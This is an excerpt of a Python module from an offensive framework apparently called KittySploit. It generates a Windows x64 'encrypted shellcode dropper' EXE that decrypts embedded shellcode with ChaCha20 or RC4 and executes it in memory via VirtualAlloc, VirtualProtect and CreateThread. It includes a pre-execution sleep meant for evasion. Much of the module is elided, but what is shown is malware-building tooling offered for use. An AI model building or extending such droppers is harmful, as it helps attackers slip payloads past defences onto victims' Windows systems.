...
"""
Encrypted shellcode dropper (Win32 API).

Minimal Windows x64 EXE: base64 payload, RC4/ChaCha20 decrypt, VirtualAlloc,
VirtualProtect, CreateThread. No inline syscall stubs — simpler than syscall loaders.
"""
...
class Module(Backdoor):
    __info__ = {
        "name": "Encrypted Shellcode Dropper Evasion",
        "description": (
            "Generate a Windows x64 EXE that decrypts embedded shellcode in memory "
            "and executes it via VirtualAlloc/VirtualProtect/CreateThread. "
            "Uses ChaCha20 or RC4 encryption with optional pre-execution sleep."
        ),
        "author": "KittySploit",
    ...
    sleep = OptInteger(15000, "Sleep time in milliseconds before executing shellcode", False)
    output_name = OptString("encrypted_dropper.exe", "Output executable filename", False)
    ...
    def run(self):
        ...
        builder = EncryptedDropperBuilder(
        ...
        out_dir, exe_name = prepare_exe_output(
            ...
            str(option_value(self, "output_name") or "encrypted_dropper.exe"),
        )
        exe_path = out_dir / exe_name

        if option_value(self, "save_source"):
            src_path = out_dir / "dropper_main.c"
        ...
        if ok and exe_path.is_file():
            ...
            print_info(
                ...
                f"Sleep: {option_value(self, 'sleep')} ms | Subsystem: {subsystem}"
            )
